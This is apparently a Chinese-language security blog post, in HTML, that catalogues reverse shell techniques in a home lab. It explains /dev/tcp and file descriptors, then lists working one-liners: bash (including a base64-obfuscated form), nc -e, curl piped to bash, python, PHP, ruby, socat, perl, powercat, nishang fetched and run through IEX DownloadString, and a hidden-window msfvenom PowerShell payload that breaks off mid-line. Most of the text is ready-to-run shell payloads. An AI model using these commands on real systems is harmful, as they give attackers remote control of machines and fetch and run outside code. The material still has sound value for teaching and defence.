@@ -1,0 +1,291 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>反弹shell的方法总结 | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>反弹shell的方法总结</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-09-17T00:49:27.477Z" id="date"> 2023-09-17</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-09-17T09:52:08.159Z" id="updated"> 2023-09-17</time></div></span><br><span>文章总字数: <div class="control">3.9k</div></span><br><span>预计阅读时间: <div class="control">16 分钟</div></span></div></div><hr><div id="post-content"><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2>
+<h3 id="1-什么是反弹shell"><a href="#1-什么是反弹shell" class="headerlink" title="1-什么是反弹shell"></a>1. 什么是反弹shell</h3>
+<p>就是控制端监听某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">假设有两台主机<br>A(控制端)<br>B(被控端)<br><br>正向shell，就是ssh、Telnet的连接，A主动发起连接B指定端口，然后A就可以通过命令控制B了<br>反弹shell，A先开启一个监听端口，让B去连接A的这个端口，连接成功后，A就能控制B了<br></code></pre></td></tr></table></figure>
+<h3 id="2-为什么需要反弹shell？"><a href="#2-为什么需要反弹shell？" class="headerlink" title="2-为什么需要反弹shell？"></a>2. 为什么需要反弹shell？</h3>
+<p>反弹shell通常用于被控端因防火墙受限、权限不足、端口被占用等情形。在渗透过程中，往往因为端口限制而无法直连目标机器，此时需要通过反弹shell来获取一个交互式shell，以便继续深入。以下详细介绍Windows和Linux系统下反弹shell的几种方式。</p>
+<h2 id="二、反弹shell命令解析"><a href="#二、反弹shell命令解析" class="headerlink" title="二、反弹shell命令解析"></a>二、反弹shell命令解析</h2>
+<h3 id="1-命令解析"><a href="#1-命令解析" class="headerlink" title="1-命令解析"></a>1. 命令解析</h3>
+<p>例如：<code>bash -i &gt;&amp; /dev/tcp/192.168.1.1/9090 0&gt;&amp;1</code></p>
+<p><strong>bash -i</strong></p>
+<pre><code>bash -i，意为创建一个交互式的bash shell
+</code></pre>
+<p><strong>/dev/tcp/192.168.1.1/9090</strong></p>
+<pre><code>dev是设备(device)的英文缩写。这里主要存放与设备（包括外设）有关的文件
+
+/dev/tcp/是linux中的一个特殊设备，打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，linux中还存在/dev/upd/
+
+所以上述命令是和192.168.1.1:9090建立TCP连接
+</code></pre>
+<p>虽然<code>/dev/tcp/$&#123;HOST&#125;/$&#123;PORT&#125;</code>这个字符虽然看起来像一个文件系统中的文件，并且位于/dev这个设备文件夹下</p>
+<p>但是这个文件并不存在，并且不是一个设备文件。这只是bash实现的用来实现网络请求的一个接口，其实就像我们自己编写的一个命令行程序，按照指定的格式输入host port参数，就能发起一个socket连接</p>
+<h3 id="2-文件描述符"><a href="#2-文件描述符" class="headerlink" title="2-文件描述符"></a>2. 文件描述符</h3>
+<p>Linux系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件</p>
+<p>所有执行I/O操作的系统调用都会通过文件描述符，即文件描述符可控制输入输出（输出/输出重定向）</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>标准输入(stdin)</td>
+<td>代码为0</td>
+<td>使用&lt;或&lt;&lt;</td>
+<td>默认设备键盘</td>
+</tr>
+<tr>
+<td>标准输出(stdout)</td>
+<td>代码为1</td>
+<td>使用&gt;或&gt;&gt;</td>
+<td>默认设备显示器</td>
+</tr>
+<tr>
+<td>标准错误输出(stderr)</td>
+<td>代码为2</td>
+<td>使用2&gt;或2&gt;&gt;</td>
+<td>默认设备显示器</td>
+</tr>
+</tbody>
+</table>
+<p>大多数Linux系统命令从你的终端接受输入并将所产生的输出发送回到您的终端。<strong>一个命令通常从一个叫标准输入的地方读取输入</strong>，默认情况下，这恰好是你的终端。同样，一个命令通常将其输入写入到标准输出，默认情况下，这也是你的终端。</p>
+<p><strong>shell 输入/输出重定向</strong></p>
+<p>如上，我们正常使用终端执行命令时，默认输入输出皆是终端。</p>
+<h3 id="3-输出重定向"><a href="#3-输出重定向" class="headerlink" title="3-输出重定向"></a>3. 输出重定向</h3>
+<p>顾名思义，就是将输出结果重定向到其他地方</p>
+<p>1️⃣</p>
+<p>使用 1&gt; 将输出结果写入到指定文件中，文件不存在则创建文件，文件如果存在会覆盖原文件内容</p>
+<p>1&gt; 中的1是默认的可以忽略不写，也就是可以写成&gt;<br>
+同理0&lt;可以写成&lt;</p>
+<p>2️⃣</p>
+<p>使用&gt;&gt;会追加内容在文件末尾</p>
+<p>3️⃣实例</p>
+<p>控制端：kali<br>
+被控端：centos</p>
+<p>kali监听8888端口<br class='item-img' data-src='image-20230917095152756.png'><img src="image-20230917095152756.png" alt="image-20230917095152756"></p>
+<p>centos输入命令</p>
+<p><code>echo hello &gt; /dev/tcp/192.168.17.128/8888</code></p>
+<p>kali监听到输出结果</p>
+<p class='item-img' data-src='image-20230917100721694.png'><img src="image-20230917100721694.png" alt="image-20230917100721694"></p>
+<h3 id="4-输入重定向"><a href="#4-输入重定向" class="headerlink" title="4-输入重定向"></a>4. 输入重定向</h3>
+<p>kali继续监听端口，centos输入命令</p>
+<p><code>bash -i &gt; /dev/tcp/192.168.17.128/8888</code></p>
+<p>kali得到输出结果</p>
+<p class='item-img' data-src='image-20230917100834681.png'><img src="image-20230917100834681.png" alt="image-20230917100834681"></p>
+<p class='item-img' data-src='image-20230917100841264.png'><img src="image-20230917100841264.png" alt="image-20230917100841264"></p>
+<p>这种方法的话，centos输一条命令，kali则回显一条命令输出结果</p>
+<p>输入输出结合获得shell</p>
+<p>两条命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt; /dev/tcp/192.168.17.128/8888<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &lt; /dev/tcp/192.168.17.128/8888<br></code></pre></td></tr></table></figure>
+<p>结合一下，即可实现反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/192.168.17.128/8888 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+<p>1️⃣</p>
+<p><code>0&gt;&amp;1</code></p>
+<p>语法格式是</p>
+<pre><code>&gt;&amp;word
+</code></pre>
+<p><code>当word为数字或者-时，表示复制文件描述符</code><br>
+复制格式有num1&lt;&amp;num2和num1&gt;&amp;num2，区别是，前者是以只读的形式打开，后者是以写的形式打开，这里两者均可</p>
+<p>0&gt;&amp;1这里意思是将0[标准输入]重定向到了1[标准输出]指向的位置</p>
+<p>2️⃣</p>
+<p><code>&gt;&amp;</code></p>
+<p>当word不是数字或-字符时，&gt;&amp;表示将标准错误输出合并到标准输出中</p>
+<h2 id="三、linux下反弹shell"><a href="#三、linux下反弹shell" class="headerlink" title="三、linux下反弹shell"></a>三、linux下反弹shell</h2>
+<p>实验环境：</p>
+<p>Win10 192.168.17.135 NC监听</p>
+<p>Kali 192.168.17.128 自带工具</p>
+<h3 id="1-bash反弹"><a href="#1-bash反弹" class="headerlink" title="1-bash反弹"></a>1. bash反弹</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">bash -i &gt;&amp; /dev/tcp/192.168.17.135/7777 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+<p>这里也是崩溃了，第一种反弹方法就遇到了障碍，我发现我的kali用不了上述的方法，它表明/dev/tcp文件不存在，网上漫游发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">linux中有一个特殊的文件/dev/tcp,打开这个文件就类似于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。<br>但是/dev/tcp本身是不存在的，无法在/dev下看到这个设备节点。<br>而在bash中通过打开/dev/tcp来取得socket的功能实际上是bash的特性，并不是系统的功能。<br></code></pre></td></tr></table></figure>
+<p>于是有些版本的bash可能默认不支持对/dev/tcp的打开。此时可以在编译bash的时候增加一个参数：–enable-net-redirections然后重新编译bash即可。</p>
+<p>但我没有增加参数，因为我当时认为我bash版本应该很高，已经默认开启了这个选项 ，于是我跟着文章查看了当前shell环境，发现为zsh，于是我新建了一个用户用于永久使用bash命令。参考文章在下面</p>
+<p class='item-img' data-src='image-20230917113013752.png'><img src="image-20230917113013752.png" alt="image-20230917113013752"></p>
+<p class='item-img' data-src='image-20230917113029488.png'><img src="image-20230917113029488.png" alt="image-20230917113029488"></p>
+<p>但有强迫症的我，接着根据几个关键词搜寻linux下如何切换shell环境，终于找到了永久切换文章，这里也放到下面，也很简单，就几条命令而已</p>
+<p>在特殊情况可以使用base64编码执行bash反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3LjEzNS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230917141108043.png'><img src="image-20230917141108043.png" alt="image-20230917141108043"></p>
+<p class='item-img' data-src='image-20230917141135544.png'><img src="image-20230917141135544.png" alt="image-20230917141135544"></p>
+<p>在kali中执行会解析成编码前的bash命令</p>
+<h3 id="2-nc反弹"><a href="#2-nc反弹" class="headerlink" title="2-nc反弹"></a>2. nc反弹</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nc -e /bin/bash 192.168.17.135 8888<br></code></pre></td></tr></table></figure>
+<p>-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(/bin/bash)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令。</p>
+<p class='item-img' data-src='image-20230917142150637.png'><img src="image-20230917142150637.png" alt="image-20230917142150637"></p>
+<p class='item-img' data-src='image-20230917142141192.png'><img src="image-20230917142141192.png" alt="image-20230917142141192"></p>
+<h3 id="3-curl反弹"><a href="#3-curl反弹" class="headerlink" title="3-curl反弹"></a>3. curl反弹</h3>
+<p>Kali开启apache服务，把bash命令写入html文件，只要文本包含bash一句话即可。</p>
+<p>开启apache可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/hou09tian/article/details/107928557?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169493177516800197051903%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169493177516800197051903&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-107928557-null-null.142%5Ev94%5EchatsearchT3_1&amp;utm_term=Kali%E5%BC%80%E5%90%AFapache%E6%9C%8D%E5%8A%A1&amp;spm=1018.2226.3001.4187">Kali Linxu中打开Apache服务</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl 192.168.17.137/bash.html|bash    //当前kali地址<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230917143237110.png'><img src="image-20230917143237110.png" alt="image-20230917143237110"></p>
+<p class='item-img' data-src='image-20230917143223662.png'><img src="image-20230917143223662.png" alt="image-20230917143223662"></p>
+<h3 id="4-whois反弹"><a href="#4-whois反弹" class="headerlink" title="4-whois反弹"></a>4. whois反弹</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">whois -h 192.168.17.135 -p 4444 `pwd` //反弹的shell只能执行后面带的命令<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230917143419652.png'><img src="image-20230917143419652.png" alt="image-20230917143419652"></p>
+<p class='item-img' data-src='image-20230917143439739.png'><img src="image-20230917143439739.png" alt="image-20230917143439739"></p>
+<h3 id="5-python反弹"><a href="#5-python反弹" class="headerlink" title="5-python反弹"></a>5. python反弹</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.17.135&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230917144244241.png'><img src="image-20230917144244241.png" alt="image-20230917144244241"></p>
+<p class='item-img' data-src='image-20230917144236500.png'><img src="image-20230917144236500.png" alt="image-20230917144236500"></p>
+<h3 id="6-PHP反弹"><a href="#6-PHP反弹" class="headerlink" title="6-PHP反弹"></a>6. PHP反弹</h3>
+<p>php反弹shell和python的方式差不多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">php -r &#x27;$sock=fsockopen(&quot;192.168.17.135&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230917144744673.png'><img src="image-20230917144744673.png" alt="image-20230917144744673"></p>
+<p class='item-img' data-src='image-20230917144738990.png'><img src="image-20230917144738990.png" alt="image-20230917144738990"></p>
+<h3 id="7-ruby反弹"><a href="#7-ruby反弹" class="headerlink" title="7-ruby反弹"></a>7. ruby反弹</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;192.168.17.135&quot;,8888).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;<br></code></pre></td></tr></table></figure>
+<p>但这个语句似乎不能用了吧，报了如下错误</p>
+<p class='item-img' data-src='image-20230917145342720.png'><img src="image-20230917145342720.png" alt="image-20230917145342720"></p>
+<p>搜寻发现下列语句</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">ruby -rsocket -e <span class="hljs-string">&#x27;exit if fork;c=TCPSocket.new(&quot;192.168.17.135&quot;,&quot;8888&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230917145455585.png'><img src="image-20230917145455585.png" alt="image-20230917145455585"></p>
+<p class='item-img' data-src='image-20230917145443467.png'><img src="image-20230917145443467.png" alt="image-20230917145443467"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">ruby -rsocket -e <span class="hljs-string">&#x27;c=TCPSocket.new(&quot;192.168.17.135&quot;,&quot;8888&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230917145611328.png'><img src="image-20230917145611328.png" alt="image-20230917145611328"></p>
+<p class='item-img' data-src='image-20230917145617861.png'><img src="image-20230917145617861.png" alt="image-20230917145617861"></p>
+<p>这两种方法均可</p>
+<h3 id="8-socat反弹"><a href="#8-socat反弹" class="headerlink" title="8-socat反弹"></a>8. socat反弹</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat <span class="hljs-built_in">exec</span>:<span class="hljs-string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.17.135:8888<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230917145813301.png'><img src="image-20230917145813301.png" alt="image-20230917145813301"></p>
+<p class='item-img' data-src='image-20230917145820648.png'><img src="image-20230917145820648.png" alt="image-20230917145820648"></p>
+<p>但是乱码真的烦，我也没细究为何</p>
+<h3 id="9-Perl反弹"><a href="#9-Perl反弹" class="headerlink" title="9-Perl反弹"></a>9. Perl反弹</h3>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;192.168.17.135&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230917150003432.png'><img src="image-20230917150003432.png" alt="image-20230917150003432"></p>
+<p class='item-img' data-src='image-20230917150008124.png'><img src="image-20230917150008124.png" alt="image-20230917150008124"></p>
+<h2 id="四、Windows下反弹shell"><a href="#四、Windows下反弹shell" class="headerlink" title="四、Windows下反弹shell"></a>四、Windows下反弹shell</h2>
+<h3 id="1-powercat反弹"><a href="#1-powercat反弹" class="headerlink" title="1-powercat反弹"></a>1. powercat反弹</h3>
+<p>用IEX下载远程PS1脚本回来权限绕过执行</p>
+<p>使用powershell执行IEX</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://github.com/besimorhino/powercat/blob/master/powercat.ps1&#x27;);powercat -c 192.168.17.137 -p 8888 -e cmd<br></code></pre></td></tr></table></figure>
+<p>这里我也很头疼一直不成功，我感觉从网上下载绕过肯定可行，但似乎失误率很高，毕竟目标文件的格式很容易犯错，当然或许可以下载到本地或vps，通过局域网或者公网访问下载。这里我选择直接下载使用看看</p>
+<p>powercat下载地址：<code>https://github.com/besimorhino/powercat</code> //下载到本地执行</p>
+<p>powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#导入模块<br>Import-Module .\powercat.ps1<br>#如果提示未能加载指定模块，则可能是权限问题，以管理员权限运行powershell，然后输入如下代码<br>Set-ExecutionPolicy Unrestricted<br>#输入如下命令可以查看帮助信息<br>powercat -h<br></code></pre></td></tr></table></figure>
+<p>输入<code>powercat -c 192.168.17.137 -p 8888 -e cmd</code></p>
+<p class='item-img' data-src='image-20230917152208329.png'><img src="image-20230917152208329.png" alt="image-20230917152208329"></p>
+<p class='item-img' data-src='image-20230917152217962.png'><img src="image-20230917152217962.png" alt="image-20230917152217962"></p>
+<h3 id="2-NC反弹"><a href="#2-NC反弹" class="headerlink" title="2-NC反弹"></a>2. NC反弹</h3>
+<p>服务端反弹：<code>nc 192.168.17.137 8888 -e c:\windows\system32\cmd.exe</code></p>
+<p class='item-img' data-src='image-20230917152419219.png'><img src="image-20230917152419219.png" alt="image-20230917152419219"></p>
+<p class='item-img' data-src='image-20230917152426327.png'><img src="image-20230917152426327.png" alt="image-20230917152426327"></p>
+<h3 id="3-nishang反弹"><a href="#3-nishang反弹" class="headerlink" title="3-nishang反弹"></a>3. nishang反弹</h3>
+<p>Nishang下载地址：<code>https://github.com/samratashok/nishang</code></p>
+<p>Nishang是一个基于PowerShell的攻击框架，整合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell</p>
+<p>将nishang下载到攻击者本地，在目标机使用powershell执行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.17.1/tools/nishang-master/Shells/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.17.137 -port 8888<br></code></pre></td></tr></table></figure>
+<p>这里依旧不行，或许访问本地下载速度很慢，等了几分钟我也没见结果，因此还是直接下载到目标机执行吧。。。。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Import-Module .\Invoke-PowerShellTcp.ps1 //导入模块<br><br>#如果提示未能加载指定模块，则可能是权限问题，以管理员权限运行powershell，然后输入如下代码<br>Set-ExecutionPolicy Unrestricted<br><br>Invoke-PowerShellTcp -Reverse -IPAddress 192.168.17.137 -port 8888<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230917155138651.png'><img src="image-20230917155138651.png" alt="image-20230917155138651"></p>
+<p class='item-img' data-src='image-20230917155145623.png'><img src="image-20230917155145623.png" alt="image-20230917155145623"></p>
+<p>这个脚本linux、windows命令均可以使用</p>
+<h3 id="4-Reverse-UDP-shell"><a href="#4-Reverse-UDP-shell" class="headerlink" title="4-Reverse-UDP-shell"></a>4. Reverse UDP shell</h3>
+<p>攻击机监听 nc -lvup 8888</p>
+<p>利用上面下载的还是放在攻击机上在目标机中powershell执行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Import-Module .\Invoke-PowerShellUdp.ps1<br><br>Invoke-PowerShellUdp -Reverse -IPAddress 192.168.17.137 -port 8888<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230917160025209.png'><img src="image-20230917160025209.png" alt="image-20230917160025209"></p>
+<p class='item-img' data-src='image-20230917160031045.png'><img src="image-20230917160031045.png" alt="image-20230917160031045"></p>
+<p>这里我一直没通，以为是什么别的问题，看来还是浅薄了，这里的监听命令必须为nc -lvup port，我这里一直是vnp，查询了一番发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">-u：指定nc使用UDP协议，默认为TCP<br></code></pre></td></tr></table></figure>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/GNNUXXL/article/details/122299540?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169493771816800192238482%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169493771816800192238482&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-122299540-null-null.142%5Ev94%5EchatsearchT3_1&amp;utm_term=nc%20%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0&amp;spm=1018.2226.3001.4187">nc命令用法举例</a></p>
+<h3 id="5-MSF反弹"><a href="#5-MSF反弹" class="headerlink" title="5-MSF反弹"></a>5. MSF反弹</h3>
+<p>我们直接可以使用 msfvenom -l 结合关键字过滤（如cmd/windows/reverse），找出我们需要的各类反弹一句话payload的路径信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msfvenom -l payloads | grep &#x27;cmd/windows/reverse&#x27;<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230917160400321.png'><img src="image-20230917160400321.png" alt="image-20230917160400321"></p>
+<p>这里找powershell的payload</p>
+<p>依照前面查找出的命令生成一句话payload路径，我们使用如下的命令生成反弹一句话，然后复制粘贴到靶机上运行即可。</p>
+<p><code>msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.17.137 LPORT=8888</code>  //host为被攻击机</p>
+<p class='item-img' data-src='image-20230917160533372.png'><img src="image-20230917160533372.png" alt="image-20230917160533372"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;192.168.17.137&#x27;</span>;<span class="hljs-variable">$b</span>=<span class="hljs-number">8888</span>;<span class="hljs-variable">$c</span>=<span class="hljs-built_in">New-Object</span> system.net.sockets.tcpclient;<span class="hljs-variable">$nb</span>=<span class="hljs-built_in">New-Object</span> System.Byte[] <span class="hljs-variable">$c</span>.ReceiveBufferSize;<span class="hljs-variable">$ob</span>=<span class="hljs-built_in">New-Object</span> System.Byte[] <span class="hljs-number">65536</span>;<span class="hljs-variable">$eb</span>=<span class="hljs-built_in">New-Object</span> System.Byte[] <span class="hljs-number">65536</span>;<span class="hljs-variable">$e</span>=<span class="hljs-built_in">new-object</span> System.Text.UTF8Encoding;<span class="hljs-variable">$p</span>=<span class="hljs-built_in">New-Object</span> System.Diagnostics.Process;<span class="hljs-variable">$p</span>.StartInfo.FileName=<span class="hljs-string">&#x27;cmd.exe&#x27;</span>;<span class="hljs-variable">$p</span>.StartInfo.RedirectStandardInput=<span class="hljs-number">1</span>;<span class="hljs-variable">$p</span>.StartInfo.RedirectStandardOutput=<span class="hljs-number">1</span>;<span class="hljs-variable">$p</span>.StartInfo.RedirectStandardError=<span class="hljs-number">1</span>;<span class="hljs-variable">$p</span>.StartInfo.UseShellExecute=<span class="hljs-number">0</span>;<span class="hljs-variable">$q</span>=<span class="hljs-variable">$p</span>.Start();<span class="hljs-variable">$is</span>=<span class="hljs-variable">$p</span>.StandardInput;<span class="hljs-variable">$os</span>=<span class="hljs-variable">$p</span>.StandardOutput;<span class="hljs-variable">$es</span>=<span class="hljs-variable">$p</span>.StandardError;<span class="hljs-variable">$osread</span>=<span class="hljs-variable">$os</span>.BaseStream.BeginRead(<span class="hljs-variable">$ob</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$ob</span>.Length, <span class="hljs-variable">$null</span>, <span 